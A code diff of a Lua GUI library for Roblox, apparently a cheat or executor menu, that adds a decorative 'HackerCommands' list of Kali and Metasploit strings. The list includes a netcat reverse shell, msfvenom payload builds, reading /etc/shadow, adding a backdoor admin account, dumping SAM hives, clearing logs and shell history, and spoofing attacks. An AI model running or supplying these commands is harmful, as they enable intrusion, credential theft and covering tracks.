@@ -9,6 +9,7 @@ local CoreGui = cloneref(game:GetService("CoreGui"))
 local TweenService = cloneref(game:GetService("TweenService"))
 local TextService = cloneref(game:GetService("TextService"))
 local Players = cloneref(game:GetService("Players"))
+local RunService = cloneref(game:GetService("RunService"))
 
 local ToggleStates = {}
 local SliderValues = {}
@@ -22,37 +23,373 @@ local CurrentColor = Color3.fromRGB(255, 255, 255)
 local CurrentTab = nil
 local TabCounter = 0
 
-local Themes = {
-    ["Black & White"] = {
-        Color = Color3.fromRGB(255, 255, 255),
-        Name = "Black & White"
-    },
-    ["Dark Gray & Black"] = {
-        Color = Color3.fromRGB(100, 100, 100),
-        Name = "Dark Gray & Black"
-    },
-    ["Orange & Black"] = {
-        Color = Color3.fromRGB(255, 140, 0),
-        Name = "Orange & Black"
-    },
-    ["Purple & Black"] = {
-        Color = Color3.fromRGB(180, 0, 255),
-        Name = "Purple & Black"
-    },
-    ["Black & Red"] = {
-        Color = Color3.fromRGB(255, 0, 0),
-        Name = "Black & Red"
-    },
-    ["Neon Red Hacker"] = {
-        Color = Color3.fromRGB(255, 30, 30),
-        Name = "Neon Red Hacker",
-        Special = true
-    }
+local HackerCommands = {
+    "root@kali:~# nmap -sV -p- 192.168.1.0/24",
+    "root@kali:~# nmap -sC -sV target.com",
+    "root@kali:~# nmap -O --osscan-guess 10.0.0.1",
+    "root@kali:~# nmap -sU -p 161,162 192.168.1.1",
+    "root@kali:~# sqlmap -u \"http://target.com/page.php?id=1\" --dbs",
+    "root@kali:~# sqlmap -r request.txt --batch --risk=3",
+    "root@kali:~# sqlmap -u target.com --os-shell",
+    "root@kali:~# john --wordlist=rockyou.txt hash.txt",
+    "root@kali:~# john --format=raw-md5 hashes.txt",
+    "root@kali:~# john --show hashes.txt",
+    "root@kali:~# msfconsole -q -r exploit.rc",
+    "root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe > payload.exe",
+    "root@kali:~# msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 R > payload.apk",
+    "root@kali:~# msfvenom -p cmd/unix/reverse_python LHOST=10.0.0.5 LPORT=4444",
+    "root@kali:~# hydra -l admin -P pass.txt ssh://10.0.0.1",
+    "root@kali:~# hydra -L users.txt -P passwords.txt ftp://192.168.1.100",
+    "root@kali:~# hydra -l root -P wordlist.txt mysql://localhost",
+    "root@kali:~# wireshark -i eth0 -k -f \"port 80\"",
+    "root@kali:~# tshark -i wlan0 -w capture.pcap",
+    "root@kali:~# nc -lvnp 4444",
+    "root@kali:~# nc -e /bin/bash 10.0.0.5 4444",
+    "root@kali:~# python3 exploit.py --target=192.168.1.105 --port=445",
+    "root@kali:~# python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+    "root@kali:~# gobuster dir -u http://target.com -w wordlist.txt -x php,txt,html",
+    "root@kali:~# gobuster vhost -u http://target.com -w subdomains.txt",
+    "root@kali:~# gobuster dns -d target.com -w subdomains.txt",
+    "root@kali:~# crunch 8 12 abcdef123456 -o passwords.txt",
+    "root@kali:~# hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l?l?l",
+    "root@kali:~# hashcat -m 1000 ntlm.txt rockyou.txt --force",
+    "root@kali:~# proxychains nmap -sT -Pn 10.0.0.0/24",
+    "root@kali:~# proxychains firefox",
+    "root@kali:~# tcpdump -i eth0 -w capture.pcap host 192.168.1.1",
+    "root@kali:~# tcpdump -i any port 80 -A",
+    "root@kali:~# nikto -h http://vulnerable.com -o scan.html",
+    "root@kali:~# aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture.cap",
+    "root@kali:~# airodump-ng wlan0mon",
+    "root@kali:~# aireplay-ng --deauth 100 -a 00:11:22:33:44:55 wlan0mon",
+    "root@kali:~# setoolkit",
+    "root@kali:~# beef-xss",
+    "root@kali:~# arpspoof -i eth0 -t 192.168.1.1 192.168.1.105",
+    "root@kali:~# dnsspoof -i eth0 -f hosts.txt",
+    "root@kali:~# driftnet -i wlan0 -d driftnet_images/",
+    "root@kali:~# urlsnarf -i wlan0",
+    "root@kali:~# dsniff -i eth0",
+    "root@kali:~# mailsnarf -i eth0",
+    "root@kali:~# sslstrip -l 8080 -w sslstrip.log",
+    "root@kali:~# volatility -f memory.dump imageinfo",
+    "root@kali:~# volatility -f memory.dump --profile=Win10x64 pslist",
+    "root@kali:~# volatility -f memory.dump --profile=Win10x64 netscan",
+    "root@kali:~# volatility -f memory.dump --profile=Win10x64 cmdscan",
+    "root@kali:~# volatility -f memory.dump --profile=Win10x64 hivelist",
+    "root@kali:~# volatility -f memory.dump --profile=Win10x64 hashdump",
+    "root@kali:~# binwalk -Me firmware.bin",
+    "root@kali:~# binwalk -e router_firmware.bin",
+    "root@kali:~# foremost -t all -i image.dd -o output/",
+    "root@kali:~# radare2 -A ./binary",
+    "root@kali:~# radare2 -d ./vulnerable",
+    "root@kali:~# r2 -c \"aaa; afl\" ./binary",
+    "root@kali:~# gdb -q ./vulnerable",
+    "root@kali:~# gdb -batch -ex \"run\" -ex \"bt\" ./vuln",
+    "root@kali:~# gdb -p $(pgrep process)",
+    "root@kali:~# checksec --file=./binary",
+    "root@kali:~# ropper -f ./binary --search \"pop rdi; ret\"",
+    "root@kali:~# ROPgadget --binary ./binary | grep \"pop rdi\"",
+    "root@kali:~# python2 -c 'print(\"A\"*1000 + \"\\xef\\xbe\\xad\\xde\")' | ./vuln",
+    "root@kali:~# python3 -c 'import struct; print(struct.pack(\"<I\", 0xdeadbeef))'",
+    "root@kali:~# strings memory.dump | grep -i password",
+    "root@kali:~# strings malware.exe | grep -i \"http\"",
+    "root@kali:~# scalpel disk.img -o recovered/",
+    "root@kali:~# exiftool -a -u suspicious.jpg",
+    "root@kali:~# steghide extract -sf hidden.jpg -p password123",
+    "root@kali:~# steghide info secret.jpg",
+    "root@kali:~# zsteg -a secret.png",
+    "root@kali:~# stegsolve.jar",
+    "root@kali:~# binwalk --dd='.*' suspicious.pdf",
+    "root@kali:~# fcrackzip -u -D -p rockyou.txt encrypted.zip",
+    "root@kali:~# pdfcrack -f protected.pdf -w wordlist.txt",
+    "root@kali:~# ophcrack -t vista_free -d tables/ -h hash.txt",
+    "root@kali:~# rainbowcrack rtgen md5 loweralpha-numeric 1 7 0 3800 33554432 0",
+    "root@kali:~# Responder -I eth0 -wrf",
+    "root@kali:~# mitm6 -d domain.local",
+    "root@kali:~# ntlmrelayx.py -tf targets.txt -smb2support",
+    "root@kali:~# crackmapexec smb 192.168.1.0/24 -u admin -p Password123",
+    "root@kali:~# crackmapexec winrm 192.168.1.10 -u admin -p pass",
+    "root@kali:~# crackmapexec mssql 192.168.1.50 -u sa -p ''",
+    "root@kali:~# enum4linux -a 192.168.1.10",
+    "root@kali:~# enum4linux -u admin -p pass -S 192.168.1.10",
+    "root@kali:~# smbclient -L //192.168.1.10 -U admin",
+    "root@kali:~# smbclient //192.168.1.10/C\\$ -U admin",
+    "root@kali:~# rpcclient -U \"\" -N 192.168.1.10",
+    "root@kali:~# wpscan --url http://target.com --enumerate u,p,t",
+    "root@kali:~# wpscan --url http://target.com --plugins-detection aggressive",
+    "root@kali:~# searchsploit apache 2.4.49",
+    "root@kali:~# searchsploit -m 50383",
+    "root@kali:~# dirb http://target.com /usr/share/wordlists/dirb/big.txt",
+    "root@kali:~# wfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ",
+    "root@kali:~# masscan -p1-65535 192.168.1.0/24 --rate=5000 -oX scan.xml",
+    "root@kali:~# masscan -p80,443,8080 10.0.0.0/8 --banners",
+    "root@kali:~# netdiscover -r 192.168.1.0/24 -P",
+    "root@kali:~# bettercap -iface wlan0 -eval \"net.probe on; ticker on\"",
+    "root@kali:~# bettercap -caplet http-ui",
+    "root@kali:~# dnschef --fakeip=10.0.0.100 --fakedomains=google.com,bank.com",
+    "root@kali:~# fierce --domain target.com --dns-servers 8.8.8.8",
+    "root@kali:~# fierce --domain target.com --wide",
+    "root@kali:~# theHarvester -d target.com -l 500 -b google,linkedin",
+    "root@kali:~# sublist3r -d target.com -o subs.txt",
+    "root@kali:~# amass enum -passive -d target.com",
+    "root@kali:~# amass intel -d target.com",
+    "root@kali:~# knockpy target.com",
+    "root@kali:~# cewl http://target.com -m 6 -w custom_wordlist.txt",
+    "root@kali:~# cewl --write passwords.txt http://target.com",
+    "root@kali:~# impacket-secretsdump domain.local/admin:pass@dc01.domain.local",
+    "root@kali:~# impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat",
+    "root@kali:~# impacket-GetUserSPNs domain.local/admin:pass -request",
+    "root@kali:~# impacket-wmiexec domain.local/admin:pass@192.168.1.10",
+    "root@kali:~# impacket-psexec domain.local/admin:pass@192.168.1.10",
+    "root@kali:~# impacket-smbexec domain.local/admin:pass@192.168.1.10",
+    "root@kali:~# BloodHound --no-sandbox",
+    "root@kali:~# neo4j console",
+    "root@kali:~# shodan search \"product:nginx country:US\"",
+    "root@kali:~# shodan search \"port:3389\"",
+    "root@kali:~# shodan host 8.8.8.8",
+    "root@kali:~# spiderfoot -s target.com -t INTERNET_NAME,IP_ADDRESS -q",
+    "root@kali:~# recon-ng -w workspace",
+    "[*] Initializing exploit module...",
+    "[*] Target OS: Windows Server 2019 Build 17763",
+    "[*] Architecture: x64",
+    "[*] Bypassing DEP via ROP chain...",
+    "[*] Calculating offsets...",
+    "[*] Base address: 0x7ffe0000",
+    "[*] POP RDI gadget at: 0x7ffe1234",
+    "[*] VirtualProtect address: 0x7ffe5678",
+    "[*] Allocating 4096 bytes of RWX memory...",
+    "[*] Copying shellcode to 0x20000000...",
+    "[*] Shellcode size: 324 bytes",
+    "[*] Triggering exploit...",
+    "[+] Exploit successful!",
+    "[*] Establishing shell connection...",
+    "[+] Shell obtained at 192.168.1.105:4444",
+    "[*] Injecting into process: lsass.exe (PID: 680)",
+    "[*] Escalating to SYSTEM...",
+    "[+] Successfully escalated to NT AUTHORITY\\SYSTEM",
+    "[*] Dumping SAM database...",
+    "[*] Extracting cached credentials...",
+    "[*] Found 12 cached domain credentials",
+    "[*] Cracking NTLM hashes with rockyou.txt...",
+    "[*] Progress: 235847/14344392 (1.64%)",
+    "[*] Cracked: 3 passwords found",
+    "[*] Establishing persistence via WMI...",
+    "[*] Installing service: WindowsUpdate",
+    "[*] Setting registry Run key...",
+    "[*] Creating scheduled task: SystemMaintenance",
+    "[*] Persistence established successfully",
+    "[*] Clearing Windows Event Logs...",
+    "[*] Clearing Security log...",
+    "[*] Clearing System log...",
+    "[*] Clearing Application log...",
+    "[*] Clearing PowerShell operational log...",
+    "[*] All logs cleared",
+    "[*] Enumerating domain controllers...",
+    "[*] DC01.domain.local (192.168.1.5)",
+    "[*] DC02.domain.local (192.168.2.5)",
+    "[*] Domain: domain.local",
+    "[*] Domain Admins: 4 members",
+    "[*] Enterprise Admins: 2 members",
+    "[*] Performing DCSync attack...",
+    "[*] Replicating credentials from DC01...",
+    "[+] Successfully extracted KRBTGT hash",
+    "[*] Creating Golden Ticket...",
+    "[+] Golden Ticket created successfully",
+    "[*] Kerberoasting service accounts...",
+    "[*] Found 6 service accounts with SPNs",
+    "[*] Requesting TGS tickets...",
+    "[*] Cracking TGS hashes...",
+    "[+] Cracked SQL_SVC: P@ssw0rd123!",
+    "[+] Cracked IIS_SVC: Summer2023!",
+    "[*] Extracting DPAPI master keys...",
+    "[*] Decrypting Chrome saved passwords for Administrator...",
+    "[*] Found 23 saved passwords",
+    "[*] Decrypting Firefox saved passwords...",
+    "[*] Found 8 saved passwords",
+    "[*] Scanning internal network for open SMB shares...",
+    "[*] 192.168.1.20: Shared (READ/WRITE)",
+    "[*] 192.168.1.30: Finance (READ)",
+    "[*] 192.168.1.40: HR_Documents (READ/WRITE)",
+    "[*] Exploiting EternalBlue (MS17-010) on 192.168.1.200...",
+    "[*] Target: Windows 7 SP1 x64",
+    "[+] DoublePulsar implant installed",
+    "[*] Sending kernel shellcode...",
+    "[+] SYSTEM shell obtained on 192.168.1.200",
+    "[*] Deploying Cobalt Strike beacon...",
+    "[*] Beacon type: HTTPS",
+    "[*] C2 Server: 45.67.89.123",
+    "[*] Sleep: 5s, Jitter: 15%",
+    "[+] Beacon established",
+    "[*] Keylogging active user session...",
+    "[*] Capturing screenshots every 30s...",
+    "[*] Activating webcam...",
+    "[+] Webcam stream available on :9090",
+    "[*] Activating microphone...",
+    "[+] Audio stream active",
+    "[*] Data exfiltration in progress...",
+    "[*] Compressing target files: archive.tar.gz",
+    "[*] Size: 2.3 GB",
+    "[*] Encrypting with AES-256-CBC...",
+    "[*] Splitting into 50MB chunks...",
+    "[*] Sending via HTTPS POST to C2...",
+    "[*] Progress: 45% (1.04 GB / 2.3 GB)",
+    "[*] Progress: 78% (1.79 GB / 2.3 GB)",
+    "[*] Exfiltration complete: 2.3 GB in 127 chunks",
+    "[*] DNS tunneling backup channel active",
+    "[*] Rotating C2 domains...",
+    "[*] New C2: cdn-update.microsoft-cloud.com",
+    "[*] Domain fronting active via CloudFront",
+    "[*] SOCKS5 proxy on 127.0.0.1:9050",
+    "[*] Pivoting to 10.0.0.0/24 via SMB beacon",
+    "[*] Scanning 10.0.0.0/24 for open ports...",
+    "[*] 10.0.0.10: 22/tcp (SSH), 80/tcp (HTTP), 3306/tcp (MySQL)",
+    "[*] 10.0.0.20: 445/tcp (SMB), 3389/tcp (RDP)",
+    "[*] 10.0.0.30: 1433/tcp (MSSQL)",
+    "[*] Brute forcing SSH on 10.0.0.10...",
+    "[+] SSH access: root:toor",
+    "[*] Extracting MySQL credentials from web config...",
+    "[+] MySQL: webapp:P@ssw0rd@10.0.0.10:3306/production_db",
+    "meterpreter > sysinfo",
+    "Computer : DESKTOP-A1B2C3",
+    "OS : Windows 10 Pro (Build 19045)",
+    "Architecture : x64",
+    "System Language : en_US",
+    "Domain : WORKGROUP",
+    "Logged On Users : 2",
+    "meterpreter > getuid",
+    "Server username: DESKTOP-A1B2C3\\Administrator",
+    "meterpreter > getsystem",
+    "...got system via technique 1 (Named Pipe Impersonation).",
+    "meterpreter > hashdump",
+    "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::",
+    "Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::",
+    "DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::",
+    "meterpreter > load kiwi",
+    "Loading extension kiwi...Success.",
+    "meterpreter > creds_all",
+    "[+] Running as SYSTEM",
+    "[*] Retrieving all credentials",
+    "msv credentials",
+    "================",
+    "Username Domain LM NTLM SHA1",
+    "-------- ------ -- ---- ----",
+    "Admin DESKTOP-A1B2C3 aad3b... 31d6c... da39a...",
+    "meterpreter > keyscan_start",
+    "Starting the keystroke sniffer ...",
+    "meterpreter > keyscan_dump",
+    "Dumping captured keystrokes...",
+    "admin<CR>Password123!<CR>",
+    "meterpreter > screenshare",
+    "Screenshare is running at http://127.0.0.1:9090/",
+    "meterpreter > webcam_list",
+    "1: USB Camera",
+    "meterpreter > webcam_stream -i 1",
+    "Starting webcam stream on http://127.0.0.1:9091/",
+    "meterpreter > download C:\\Users\\Admin\\Documents\\secret.xlsx /root/loot/",
+    "[*] Downloading: secret.xlsx -> /root/loot/secret.xlsx",
+    "[*] Downloaded 2.50 MiB of 2.50 MiB (100.0%): secret.xlsx",
+    "[+] Download complete",
+    "meterpreter > upload /root/payload.exe C:\\Windows\\Temp\\svchost.exe",
+    "[*] Uploading: payload.exe -> C:\\Windows\\Temp\\svchost.exe",
+    "[*] Uploaded 50.00 KiB of 50.00 KiB (100.0%): payload.exe",
+    "[+] Upload complete",
+    "meterpreter > execute -f cmd.exe -i -H",
+    "Process 4280 created.",
+    "Channel 3 created.",
+    "Microsoft Windows [Version 10.0.19045.2486]",
+    "C:\\Windows\\system32> whoami",
+    "nt authority\\system",
+    "C:\\Windows\\system32> net user backdoor P@ssw0rd /add",
+    "The command completed successfully.",
+    "C:\\Windows\\system32> net localgroup Administrators backdoor /add",
+    "The command completed successfully.",
+    "C:\\Windows\\system32> reg save HKLM\\SAM C:\\Temp\\sam.hive",
+    "The operation completed successfully.",
+    "C:\\Windows\\system32> reg save HKLM\\SYSTEM C:\\Temp\\sys.hive",
+    "The operation completed successfully.",
+    "meterpreter > portfwd add -l 3389 -p 3389 -r 10.0.0.20",
+    "[*] Forwarding 0.0.0.0:3389 -> 10.0.0.20:3389",
+    "meterpreter > run post/windows/manage/enable_rdp",
+    "[*] Enabling RDP",
+    "[+] RDP is enabled",
+    "meterpreter > run post/windows/gather/credentials/credential_collector",
+    "[*] Harvesting credentials...",
+    "[+] Found 15 sets of credentials",
+    "meterpreter > run post/multi/manage/shell_to_meterpreter",
+    "[*] Upgrading shell to meterpreter...",
+    "[+] Meterpreter session 2 opened",
+    "meterpreter > background",
+    "[*] Backgrounding session 1...",
+    "msf6 exploit(multi/handler) > sessions -l",
+    "Active sessions",
+    "===============",
+    "Id Name Type Information Connection",
+    "-- ---- ---- ----------- ----------",
+    "1 meterpreter x64/windows DESKTOP-A1B2C3\\Admin @ DESKTOP-A1B2C3 192.168.1.100:4444 -> 45.67.89.123:443",
+    "2 meterpreter x64/windows NT AUTHORITY\\SYSTEM @ DESKTOP-A1B2C3 192.168.1.100:4445 -> 45.67.89.123:443",
+    "msf6 exploit(multi/handler) > sessions -i 2",
+    "[*] Starting interaction with 2...",
+    "meterpreter >",
+    "[*] Running module against 192.168.1.0/24",
+    "[*] 192.168.1.1:445 - Windows Server 2019 Standard (Build 17763)",
+    "[*] 192.168.1.5:445 - Windows Server 2016 Standard (Build 14393)",
+    "[*] 192.168.1.10:445 - Windows 10 Pro 19045",
+    "[*] 192.168.1.20:445 - Windows 11 Pro 22621",
+    "[*] 192.168.1.50:445 - Windows 7 Ultimate 7601 (VULNERABLE)",
+    "[+] Target acquired: 192.168.1.50",
+    "[*] CVE-2019-0708 (BlueKeep) detected",
+    "[*] Target: Windows 7 SP1 x64",
+    "[*] Selected target: Windows 7 SP1 x64 (6.1.7601)",
+    "[*] Attempting exploitation...",
+    "[*] Grooming pools...",
+    "[*] Allocating holes...",
+    "[*] Spraying page tables...",
+    "[*] Triggering free...",
+    "[*] Seizing backref...",
+    "[+] Kernel shellcode placed",
+    "[+] Exploitation successful!",
+    "[*] Shell session opened",
+    "C:\\Windows\\system32>",
+    "root@kali:~# cat /etc/passwd | grep bash",
+    "root@kali:~# cat /etc/shadow | grep root",
+    "root@kali:~# cat /var/log/auth.log | grep \"Failed\"",
+    "root@kali:~# find / -type f -name \"*.sql\" 2>/dev/null",
+    "root@kali:~# find / -perm -4000 -type f 2>/dev/null",
+    "root@kali:~# grep -r \"password\" /var/www/html/ --include=\"*.php\"",
+    "root@kali:~# locate id_rsa",
+    "root@kali:~# ssh -i id_rsa root@10.0.0.10",
+    "root@kali:~# scp /root/loot.tar.gz user@10.0.0.5:/tmp/",
+    "root@kali:~# ssh -D 1080 -f -C -q -N user@jump-host.com",
+    "root@kali:~# ssh -L 3389:192.168.1.100:3389 pivot@10.0.0.1",
+    "root@kali:~# chisel server -p 8080 --reverse",
+    "root@kali:~# chisel client 10.0.0.5:8080 R:socks",
+    "root@kali:~# socat TCP-LISTEN:8080,fork TCP:192.168.1.100:80",
+    "root@kali:~# iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080",
+    "root@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward",
+    "root@kali:~# ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.105/",
+    "root@kali:~# xterm -hold -e \"tail -f /var/log/apache2/access.log\" &",
+    "root@kali:~# watch -n 1 \"netstat -tulpn | grep LISTEN\"",
+    "root@kali:~# htop",
+    "root@kali:~# tmux new -s hack",
+    "root@kali:~# screen -S scan",
+    "root@kali:~# history -c && history -w",
+    "root@kali:~# unset HISTFILE && kill -9 $$",
+    "root@kali:~# shred -zvu -n 7 secret_file.txt",
+    "root@kali:~# bleachbit -c system.trash firefox.cache",
+    "root@kali:~# macchanger -r wlan0",
+    "root@kali:~# tor",
+    "root@kali:~# torsocks wget http://darkweb.onion/file.txt",
+    "root@kali:~# dd if=/dev/urandom of=/swap bs=1M count=1024",
+    "root@kali:~# base64 /dev/urandom | head -c 32",
+    "root@kali:~# openssl rand -base64 32",
+    "root@kali:~# gpg -c --cipher-algo AES256 secret.txt",
+    "root@kali:~# openssl enc -aes-256-cbc -salt -in data.txt -out data.enc"
 }
 
 function Library:CreateLib(name, theme)
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = name
+    screenGui.ResetOnSpawn = false
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     
     local success, err = pcall(function()
         if protect_gui then
@@ -75,15 +412,15 @@ function Library:CreateLib(name, theme)
     if not pcall(function() return screenGui.Parent end) then
         screenGui.Parent = CoreGui
     end
-    
-    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
     local isMinimized = false
     local isHidden = false
     local savedSize = Vector2.new(600, 400)
     local savedPos = Vector2.new(0, 0)
-    local minBtnPos = Vector2.new(0, 0)
-    local isNeonHackerTheme = false
+    local isScannerTheme = false
+    local hackerLabels = {}
+    local tabScrollPosition = 0
+    local maxTabScroll = 0
 
     local mainFrame = Instance.new("Frame")
     mainFrame.Name = "MainFrame"
@@ -95,6 +432,7 @@ function Library:CreateLib(name, theme)
     mainFrame.Active = true
     mainFrame.Draggable = true
     mainFrame.ClipsDescendants = true
+    mainFrame.ZIndex = 1
 
     local mainCorner = Instance.new("UICorner")
     mainCorner.CornerRadius = UDim.new(0, 8)
@@ -103,9 +441,11 @@ function Library:CreateLib(name, theme)
     local mainStroke = Instance.new("UIStroke")
     mainStroke.Color = CurrentColor
     mainStroke.Thickness = 1.5
+    mainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
     mainStroke.Parent = mainFrame
 
     local scanLine = Instance.new("Frame")
+    scanLine.Name = "ScanLine"
     scanLine.Size = UDim2.new(1, 0, 0, 2)
     scanLine.Position = UDim2.new(0, 0, 0, 0)
     scanLine.BackgroundColor3 = Color3.fromRGB(255, 30, 30)
@@ -113,67 +453,16 @@ function Library:CreateLib(name, theme)
     scanLine.BorderSizePixel = 0
     scanLine.Parent = mainFrame
     scanLine.Visible = false
+    scanLine.ZIndex = 100
 
-    local minBtnFrame = Instance.new("TextButton")
-    minBtnFrame.Name = "MinBtn"
-    minBtnFrame.Size = UDim2.new(0, 40, 0, 40)
-    minBtnFrame.Position = UDim2.new(0.5, -20, 0.5, -20)
-    minBtnFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    minBtnFrame.BorderSizePixel = 1
-    minBtnFrame.BorderColor3 = CurrentColor
-    minBtnFrame.Text = name:sub(1, 1)
-    minBtnFrame.TextColor3 = CurrentColor
-    minBtnFrame.TextSize = 20
-    minBtnFrame.Font = Enum.Font.Code
-    minBtnFrame.Parent = screenGui
-    minBtnFrame.Visible = false
-    minBtnFrame.Active = true
-    minBtnFrame.Draggable = true
-    
-    local minCorner = Instance.new("UICorner")
-    minCorner.CornerRadius = UDim.new(0, 6)
-    minCorner.Parent = minBtnFrame
-    
-    local isDragging = false
-    local dragStartPos = nil
-    
-    minBtnFrame.MouseButton1Down:Connect(function()
-        isDragging = false
-        dragStartPos = Vector2.new(minBtnFrame.AbsolutePosition.X, minBtnFrame.AbsolutePosition.Y)
-    end)
-    
-    minBtnFrame.InputChanged:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseMovement and dragStartPos then
-            local currentPos = Vector2.new(minBtnFrame.AbsolutePosition.X, minBtnFrame.AbsolutePosition.Y)
-            if (currentPos - dragStartPos).Magnitude > 3 then
-                isDragging = true
-            end
-        end
-    end)
-    
-    minBtnFrame.DragStopped:Connect(function()
-        minBtnPos = Vector2.new(minBtnFrame.AbsolutePosition.X, minBtnFrame.AbsolutePosition.Y)
-        dragStartPos = nil
-    end)
-    
-    minBtnFrame.MouseButton1Click:Connect(function()
-        if isDragging then
-            isDragging = false
-            return
-        end
-        if isHidden then return end
-        isMinimized = false
-        mainFrame.Visible = true
-        minBtnFrame.Visible = false
-        local newX = minBtnPos.X - savedSize.X/2 + 20
-        local newY = minBtnPos.Y - savedSize.Y/2 + 20
-        mainFrame.Size = UDim2.new(0, savedSize.X, 0, savedSize.Y)
-        mainFrame.Position = UDim2.new(0, math.clamp(newX, 0, workspace.CurrentCamera.ViewportSize.X - savedSize.X), 0, math.clamp(newY, 0, workspace.CurrentCamera.ViewportSize.Y - savedSize.Y))
-    end)
-
-    mainFrame.DragStopped:Connect(function()
-        savedPos = Vector2.new(mainFrame.AbsolutePosition.X, mainFrame.AbsolutePosition.Y)
-    end)
+    local hackerBg = Instance.new("Frame")
+    hackerBg.Name = "HackerBg"
+    hackerBg.Size = UDim2.new(1, 0, 1, 0)
+    hackerBg.Position = UDim2.new(0, 0, 0, 0)
+    hackerBg.BackgroundTransparency = 1
+    hackerBg.ZIndex = 0
+    hackerBg.Parent = mainFrame
+    hackerBg.ClipsDescendants = true
 
     local topBar = Instance.new("Frame")
     topBar.Name = "TopBar"
@@ -181,14 +470,17 @@ function Library:CreateLib(name, theme)
     topBar.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
     topBar.BorderSizePixel = 0
     topBar.Parent = mainFrame
+    topBar.ZIndex = 10
 
     local topBarStroke = Instance.new("UIStroke")
     topBarStroke.Color = CurrentColor
     topBarStroke.Thickness = 1
     topBarStroke.LineJoinMode = Enum.LineJoinMode.Round
+    topBarStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
     topBarStroke.Parent = topBar
 
     local titleLabel = Instance.new("TextLabel")
+    titleLabel.Name = "TitleLabel"
     titleLabel.Size = UDim2.new(1, -130, 1, 0)
     titleLabel.Position = UDim2.new(0, 10, 0, 0)
     titleLabel.BackgroundTransparency = 1
@@ -200,6 +492,7 @@ function Library:CreateLib(name, theme)
     titleLabel.Parent = topBar
 
     local settingsBtn = Instance.new("TextButton")
+    settingsBtn.Name = "SettingsBtn"
     settingsBtn.Size = UDim2.new(0, 26, 0, 26)
     settingsBtn.Position = UDim2.new(1, -112, 0, 2)
     settingsBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -216,6 +509,7 @@ function Library:CreateLib(name, theme)
     settingsCorner.Parent = settingsBtn
 
     local minimizeBtn = Instance.new("TextButton")
+    minimizeBtn.Name = "MinimizeBtn"
     minimizeBtn.Size = UDim2.new(0, 26, 0, 26)
     minimizeBtn.Position = UDim2.new(1, -84, 0, 2)
     minimizeBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -232,6 +526,7 @@ function Library:CreateLib(name, theme)
     minimizeCorner.Parent = minimizeBtn
 
     local hideBtn = Instance.new("TextButton")
+    hideBtn.Name = "HideBtn"
     hideBtn.Size = UDim2.new(0, 26, 0, 26)
     hideBtn.Position = UDim2.new(1, -56, 0, 2)
     hideBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -248,6 +543,7 @@ function Library:CreateLib(name, theme)
     hideCorner.Parent = hideBtn
 
     local closeButton = Instance.new("TextButton")
+    closeButton.Name = "CloseButton"
     closeButton.Size = UDim2.new(0, 26, 0, 26)
     closeButton.Position = UDim2.new(1, -28, 0, 2)
     closeButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -264,6 +560,7 @@ function Library:CreateLib(name, theme)
     closeCorner.Parent = closeButton
 
     local settingsFrame = Instance.new("Frame")
+    settingsFrame.Name = "SettingsFrame"
     settingsFrame.Size = UDim2.new(0, 260, 0, 340)
     settingsFrame.Position = UDim2.new(1, -270, 0, 35)
     settingsFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -277,7 +574,14 @@ function Library:CreateLib(name, theme)
     sfCorner.CornerRadius = UDim.new(0, 6)
     sfCorner.Parent = settingsFrame
 
+    local sfStroke = Instance.new("UIStroke")
+    sfStroke.Color = CurrentColor
+    sfStroke.Thickness = 1
+    sfStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    sfStroke.Parent = settingsFrame
+
     local settingsTabContainer = Instance.new("Frame")
+    settingsTabContainer.Name = "SettingsTabContainer"
     settingsTabContainer.Size = UDim2.new(1, 0, 0, 30)
     settingsTabContainer.Position = UDim2.new(0, 0, 0, 0)
     settingsTabContainer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
@@ -291,6 +595,7 @@ function Library:CreateLib(name, theme)
     settingsTabList.Parent = settingsTabContainer
 
     local colorsTabBtn = Instance.new("TextButton")
+    colorsTabBtn.Name = "ColorsTabBtn"
     colorsTabBtn.Size = UDim2.new(0.5, 0, 1, 0)
     colorsTabBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
     colorsTabBtn.BorderSizePixel = 1
@@ -302,6 +607,7 @@ function Library:CreateLib(name, theme)
     colorsTabBtn.Parent = settingsTabContainer
 
     local otherTabBtn = Instance.new("TextButton")
+    otherTabBtn.Name = "OtherTabBtn"
     otherTabBtn.Size = UDim2.new(0.5, 0, 1, 0)
     otherTabBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
     otherTabBtn.BorderSizePixel = 1
@@ -313,6 +619,7 @@ function Library:CreateLib(name, theme)
     otherTabBtn.Parent = settingsTabContainer
 
     local colorsContent = Instance.new("Frame")
+    colorsContent.Name = "ColorsContent"
     colorsContent.Size = UDim2.new(1, 0, 1, -30)
     colorsContent.Position = UDim2.new(0, 0, 0, 30)
     colorsContent.BackgroundTransparency = 1
